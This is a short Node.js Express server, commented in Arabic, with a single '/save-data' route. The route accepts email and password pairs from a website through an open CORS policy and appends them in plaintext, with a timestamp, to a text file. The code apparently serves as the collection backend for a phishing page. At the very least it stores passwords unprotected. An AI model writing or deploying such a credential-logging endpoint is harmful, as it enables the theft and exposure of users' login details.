const express = require('express');
const fs = require('fs');
const cors = require('cors');
const app = express();

app.use(cors()); // للسماح للموقع بالاتصال بالسيرفر
app.use(express.json());

// المسار الذي سيستقبل البيانات من الموقع
app.post('/save-data', (req, res) => {
    const { email, password } = req.body;
    const logEntry = `Email: ${email} | Password: ${password} | Date: ${new Date().toLocaleString()}\n`;

    // حفظ البيانات في ملف نصي اسمه database.txt
    fs.appendFile('database.txt', logEntry, (err) => {
        if (err) {
            console.error("خطأ في الكتابة:");
            return res.status(500).send("فشل الحفظ");
        }
        console.log("تم حفظ مستخدم جديد!");
        res.status(200).send("تم الحفظ بنجاح");
    });
});

app.listen(3000, () => console.log('السيرفر خدام على البورت 3000'));